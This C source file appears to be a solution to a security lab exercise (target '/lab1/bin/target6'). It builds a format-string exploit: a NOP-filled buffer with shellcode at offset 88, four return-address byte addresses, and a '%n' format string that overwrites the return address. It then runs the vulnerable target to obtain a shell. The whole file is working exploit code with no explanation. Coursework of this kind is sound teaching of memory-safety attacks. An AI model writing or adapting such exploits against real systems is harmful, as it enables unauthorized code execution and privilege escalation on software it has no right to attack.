#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/lab1/bin/target6"
#define NOOP 0x90                 // no-op instruction
#define BUFLEN 352                // target buffer length
#define SHELL_START 0xffffdede     // addr of the start of the buffer &buf[88]
#define SHELL_START_IDX 88
#define ADDR_RET_BYTE0 0xffffdcf0
#define ADDR_RET_BYTE1 0xffffdcf1
#define ADDR_RET_BYTE2 0xffffdcf2
#define ADDR_RET_BYTE3 0xffffdcf3
#define ADDR_LEN 4

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[BUFLEN];

  memset(buf, NOOP, sizeof(buf) - 1);
  buf[BUFLEN - 1] = '\0';

  memcpy(buf + 88, shellcode, sizeof(shellcode) - 1);

  *(unsigned int*) (buf + ADDR_LEN) = ADDR_RET_BYTE0;
  *(unsigned int*) (buf + ADDR_LEN * 2) = ADDR_RET_BYTE1;
  *(unsigned int*) (buf + ADDR_LEN * 4) = ADDR_RET_BYTE2;
  *(unsigned int*) (buf + ADDR_LEN * 5) = ADDR_RET_BYTE3;
  char *format_byte_one = "%198c%n%n%33c%n%n";
  memcpy(buf + ADDR_LEN * 6, format_byte_one, strlen(format_byte_one));

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
